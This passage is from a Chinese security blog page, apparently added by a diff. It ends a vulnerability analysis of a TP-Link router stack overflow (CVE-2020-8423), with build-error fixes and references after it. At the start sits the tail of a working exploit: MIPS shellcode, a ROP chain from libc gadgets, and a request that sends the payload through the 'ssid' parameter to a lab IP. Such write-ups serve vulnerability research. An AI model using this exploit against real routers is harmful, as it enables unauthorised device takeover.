class="string">b"\x01\xe0\x78\x27\xaf\xaf\xff\xf0\x27\xa5\xff\xf2\x24\x0f\xff\xef"</span></span><br><span class="line">shellcode+=<span class="string">b"\x01\xe0\x30\x27\x24\x02\x10\x4a\x01\x01\x01\x0c\x8f\xa4\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x28\x05\xff\xff\x24\x02\x0f\xdf\x01\x01\x01\x0c\x2c\x05\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\xff\xfd\x01\xc0\x28\x27"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x02\x0f\xdf\x01\x01\x01\x0c\x24\x0e\x3d\x28\xaf\xae\xff\xe2"</span></span><br><span class="line">shellcode+=<span class="string">b"\x24\x0e\x77\xf9\xaf\xae\xff\xe0\x8f\xa4\xff\xe2\x28\x05\xff\xff"</span></span><br><span class="line">shellcode+=<span class="string">b"\x28\x06\xff\xff\x24\x02\x0f\xab\x01\x01\x01\x0c"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s0=p32(<span class="number">0x11111111</span>)</span><br><span class="line">s1=p32(libc_base+g2)</span><br><span class="line">s2=p32(libc_base+sleep)</span><br><span class="line">ra=p32(libc_base+g1)</span><br><span class="line">payload=<span class="string">b'/%0a'</span>*<span class="number">0x55</span>+<span class="string">b'a'</span>*<span class="number">2</span>+s0+s1+s2+ra</span><br><span class="line">payload+=<span class="string">b'a'</span>*<span class="number">0x1c</span></span><br><span class="line">payload+=p32(libc_base+g4) <span class="comment">#s1</span></span><br><span class="line">payload+=p32(<span class="number">0x22222222</span>)</span><br><span class="line">payload+=p32(libc_base+g3) <span class="comment">#ra</span></span><br><span class="line">payload+=<span class="string">b'a'</span>*<span class="number">0x18</span></span><br><span class="line">payload+=shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">path,cookie</span>):</span><br><span class="line">    headers = {</span><br><span class="line">            <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"</span>,</span><br><span class="line">                <span class="string">"Cookie"</span>:<span class="string">"Authorization=Basic{cookie}"</span>.<span class="built_in">format</span>(cookie=<span class="built_in">str</span>(cookie))}</span><br><span class="line"></span><br><span class="line">    params = {</span><br><span class="line">        <span class="string">"mode"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"curRegion"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"chanWidth"</span>:<span class="string">"100"</span>,</span><br><span class="line">                <span class="string">"channel"</span>:<span class="string">"1000"</span>,</span><br><span class="line">                <span class="string">"ssid"</span>:urllib.parse.unquote(payload)</span><br><span class="line">        }</span><br><span class="line">    url=<span class="string">"http://192.168.123.162:80/{path}/userRpm/popupSiteSurveyRpm_AP.htm"</span>.<span class="built_in">format</span>(path=<span class="built_in">str</span>(path))</span><br><span class="line">    resp = session.get(url,params=params,headers=headers,timeout=<span class="number">10</span>)</span><br><span class="line">    <span class="built_in">print</span> (resp.text)</span><br><span class="line"></span><br><span class="line">exp(<span class="string">"QEIFMZVBEMCABIIB"</span>,<span class="string">"%20YWRtaW46MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D"</span>)</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>遇到的环境问题</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">unsquashfs.c: In function ‘read_super’:</span><br><span class="line">unsquashfs.c:<span class="number">1835</span>:<span class="number">5</span>: error: this ‘<span class="keyword">if</span>’ clause does <span class="keyword">not</span> guard... [-Werror=misleading-indentation]</span><br><span class="line"> <span class="number">1835</span> |     <span class="keyword">if</span>(swap)</span><br><span class="line">      |     ^~</span><br><span class="line">unsquashfs.c:<span class="number">1841</span>:<span class="number">9</span>: note: ...this statement, but the latter <span class="keyword">is</span> misleadingly indented <span class="keyword">as</span> <span class="keyword">if</span> it were guarded by the ‘<span class="keyword">if</span>’</span><br><span class="line"> <span class="number">1841</span> |         read_fs_bytes(fd, SQUASHFS_START, sizeof(struct squashfs_super_block),</span><br><span class="line">      |         ^~~~~~~~~~~~~</span><br><span class="line">cc1: <span class="built_in">all</span> warnings being treated <span class="keyword">as</span> errors</span><br><span class="line">make: *** [&lt;内置&gt;：unsquashfs.o] 错误 <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<p>解决</p>
+<p>[issues]: <a href="https://github.com/devttys0/sasquatch/issues/48">‘if’ clause does not guard… [-Werror=misleading-indentation] · Issue #48 · devttys0/sasquatch</a></p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/devttys0/sasquatch/pull/<span class="number">51.</span>patch &amp;&amp; patch -p1 &lt;<span class="number">51.</span>patch</span><br><span class="line">./build.sh</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r: <span class="keyword">in</span> `/home/hpp/buildroot/output/build/host-tar-<span class="number">1.35</span><span class="string">': configure: error: you should not run configure as root (set FORCE_UNSAFE_CONFIGURE=1 in environment to bypass this check) See `config.log'</span> <span class="keyword">for</span> more details make: *** [package/pkg-generic.mk:<span class="number">279</span>：</span><br></pre></td></tr></tbody></table></figure>
+<p>解决</p>
+<figure class="highlight py"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo make FORCE_UNSAFE_CONFIGURE=<span class="number">1</span></span><br></pre></td></tr></tbody></table></figure>
+<h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><p>[1]:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/230259#h2-0">Mips架构下漏洞分析入门-安全客 - 安全资讯平台</a> </p>
+<p>[2]: <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203486#h3-6">TP-Link WR841N 栈溢出漏洞（CVE-2020-8423）分析-安全客 - 安全资讯平台</a></p>
+<p>[3]:<a target="_blank" rel="noopener" href="https://brvc3.github.io/2023/03/16/CVE-2020-8423后篇/">CVE-2020-8423后篇 | Brvc3’s Base</a></p>
+<p>[4]:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/179510#h2-4">路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析-安全客 - 安全资讯平台</a></p>
+<p>[5]:<a target="_blank" rel="noopener" href="https://blog.csdn.net/tianxuhong/article/details/50974400">Linux系统调用Hook姿势总结_linux vfs hook-CSDN博客</a></p>
+
+    </article>
+    
+    <div class="read-nums">
+      <!-- id 将作为查询条件 -->
+      <span id="/posts/24932e9/" class="leancloud_visitors" data-flag-title="Your Article Title">
+        <em class="post-meta-item-text">浏览量</em>
+        <i class="leancloud-visitors-count"></i>
+      </span>
+    </div>
+    <div class="comments-intro">
+      <h2>评论区</h2>
+      <p>欢迎你留下宝贵的意见，昵称输入QQ号会显示QQ头像哦~</p>
+    </div>
+    <div id="vcomments" class="vcomments"></div>
+    
+  </div>
+  <div class="article-catelogue">
+    <div class="article-catelogue--wrapper">
+      <div class="catelogue catelogue-1">
+        <h3>目录</h3>
+        <ol class="toc"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85"><span class="toc-number">1.</span> <span class="toc-text">工具安装</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">2.</span> <span class="toc-text">配置运行环境</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+      
+        <div class="catelogue catelogue-2">
+           
+          
+            <p>
+              <span>下一篇</span>
+              <a target="_blank" rel="noopener" href="//posts/7e7e55f1/">xpdf</a>
+            </p>
+          
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+
+<script>
+  // var定义，避免pjax重新进来造成的重复声明错误
+  var config = JSON.parse('{"enable":true,"appId":"Pf8zCXGEH1qsprnWfikVVujL-gzGzoHsz","appKey":"qOqoiUHhH1TGtLRUYURkLRQX","placeholder":"请留下你宝贵的意见吧~","meta":["nick"],"recordIP":true,"visitor":true,"enableQQ":true}')
+  new Valine({
+    el: '#vcomments',
+    appId: config.appId,
+    appKey: config.appKey,
+    placeholder: config.placeholder,
+    meta: config.meta,
+    recordIP: config.recordIP,
+    visitor: config.visitor,
+    enableQQ: config.enableQQ,
+    path: '/posts/24932e9/'
+  })
+</script>
+
+
+<script>
+  $(document).on('pjax:complete', function() {
+    const tocs = document.querySelector('.toc')
+    const links = tocs ? tocs.querySelectorAll('a') : []
+    links.forEach(link => {
+      link.addEventListener('click', e => {
+        const href = decodeURIComponent(e.href)
+        href.search(/#(.*)/)
+        const id = RegExp.$1
+        const target = document.querySelector('#' + id)
+        const top = target.offsetTop
+        document.documentElement.scrollTo({
+          top: top - 100,
+          behavior: 'smooth'
+        })
+        e.preventDefault()
+      })
+    })
+  })
+</script> 
+
+</div>
+      <div class="main-right-wrapper"><div class="main-right">
+  <div class="main-right--board">
+    <div class="main-right--title">
+      <h5>公告栏</h5>
+      <i class="iconfont icon-gonggao"></i>
+    </div>
+    <div class="main-right--content">
+      Hello~大噶好。唔系可乐爱宅着，欢迎你们来到我的博客小站，希望能在这里收获到有用的东西哦！ 
+    </div>
+  </div>
+
+  <div id="aplayer" class="main-right--music"></div>
+
+  <div class="operate-items">
+    <div class="operate-item backtop">
+      <i class="iconfont icon-huidaodingbu"></i>
+      <span>回到顶部</span>
+    </div>
+    
+    <div class="operate-item turn-comment hidden">
+      <i class="iconfont icon-pinglun"></i>
+      <span>查看评论</span>
+    </div>
+    
+  </div>
+
+  <div class="main-right--site">
+    <div class="main-right--power">
+      <p>Power By <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a>.</p>
+      <p>Theme：<a href="https://github.com/Aizener/hexo-theme-cola">Cola.</a></p>
+    </div>
+    <p class="main-right--refer"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/index">蜀ICP备2022005384号-1</a> </p>
+  </div>
+</div>
+
+<script>
+  function setOperateItem () {
+    const reg = /\d{4}\/\d{2}\/\d{2}\/.+/
+    const path = location.pathname
+    const operateDom = document.querySelector('.main-right .operate-items')
+    const commentDom = document.querySelector('.turn-comment')
+    const cateloguDom = document.querySelector('.article-catelogue > .article-catelogue--wrapper');
+
+    if (commentDom) {
+      if (reg.test(path) || path.match(/\/log\/.+/)) {
+        commentDom.classList.remove('hidden')
+        const newDom = operateDom.cloneNode(true);
+        const _backtopDom = newDom.querySelector('.backtop');
+        const _commentDom = newDom.querySelector('.turn-comment');
+        _backtopDom.addEventListener('click', () => backTopEvent());
+        _commentDom.addEventListener('click', () => commentDomEvent());
+        cateloguDom.appendChild(newDom);
+      } else {
+        commentDom.classList.add('hidden')
+      }
+    }
+  }
+
+  setOperateItem()
+  const musics = JSON.parse(`[{"name":"daylight","artist":"Seredris","url":"music/daylight.mp3","cover":"http://ting6.yymp3.net:82/new25/songdongye/11.mp3"},{"name":"lies","artist":"Gragon","url":"music/lies.mp3","cover":"https://img2.baidu.com/it/u=705831265,2862720033&fm=253&fmt=auto&app=138&f=JPEG?w=500&h=500"}]`)
+  const ap = new APlayer({
+    container: document.querySelector('#aplayer'),
+    audio: musics,
+  })
+
+  $(document).on('pjax:complete', function() {
+    setOperateItem()
+  })
+
+  document.querySelector('.backtop').addEventListener('click', () => {
+    backTopEvent();
+  })
+  const dom = document.querySelector('.turn-comment')
+  dom && dom.addEventListener('click', () => {
+    commentDomEvent();
+  })
+
+  function backTopEvent() {
+    document.documentElement.scrollTo({
+      top: 0,
+      behavior: 'smooth'
+    })
+  }
+
+  function commentDomEvent() {
+    const commentDom = document.querySelector('.comments-intro')
+    if (!commentDom) return
+    const top = commentDom.offsetTop, height = commentDom.offsetHeight
+    document.documentElement.scrollTo({
+      top: top - 2 * height,
+      behavior: 'smooth'
+    })
+  }
+</script></div>
+    </section>
+  </div>
+  <div id="progress" class="progress"></div>
+  <div id="gray" class="gray"></div>
+
+  <script>
+    function initScroll () {
+      document.addEventListener('scroll', () => {
+        const doc = document.documentElement
+        const scrollTop = doc.scrollTop
+        const pageHeight = doc.offsetHeight
+        const clientHeight = doc.clientHeight
+        const ratio = scrollTop / (pageHeight - clientHeight)
+        const progress = document.querySelector('#progress')
+        const avatarImg = document.querySelector('.main-left--avatar')
+        progress.style.width = (100 * ratio) + '%'
+        avatarImg.style.transform = `rotate(${360 * ratio}deg)`
+      })
+    }
+
+    const rootPath = "/"
+
+    const checkAndSetArticlePageLayout = () => {
+      const path = location.pathname.replace(rootPath, '');
+      if (
+        /^\/?\d{4}\/\d{2}\/\d{2}\/.*/.test(path) ||
+        /^log\/.+/.test(path)
+      ) {
+        $('.main-container, .main-right, .main-right-wrapper').addClass('is-article')
+      } else {
+        $('.main-container, .main-right, .main-right-wrapper').removeClass('is-article')
+      }
+    }
+
+    const gray = "none"
+    const setGrayStyle = () => {
+      if (gray === 'none') {
+        return
+      } else if (gray === 'index') {
+        location.pathname === '/' ? $('#gray').show() : $('#gray').hide()
+      } else if (gray === 'all') {
+        $('#gray').show()
+      }
+    }
+    setGrayStyle()
+
+
+    window.onload = function () {
+      checkAndSetArticlePageLayout()
+      setTimeout(() => {
+        $('#load').slideUp()
+        $('#container').slideToggle()
+        setTimeout(() => {
+          initScroll();
+        }, 500)
+      }, 500)
+    }
+    
+    let status = 0
+    // 对所有链接跳转事件绑定pjax容器container
+    $(document).pjax('a[target!=_blank]', '#main-container', {
+      container: '#main-container',
+      fragment: '#main-container',
+      timeout: 8000
+    })
+
+    $(document).on('pjax:start', function() {
+    })
+    $(document).on('pjax:complete', function() {
+      status = 0
+      $('.main-container').addClass('to-up').on('animationend', function() {
+        $(this).removeClass('to-up')
+      })
+      setGrayStyle()
+      checkAndSetArticlePageLayout()
+    })
+    $(document).on('pjax:popstate', function() {
+      status = -1
+      checkAndSetArticlePageLayout()
+    });
+  </script>
+</body>
+</html>
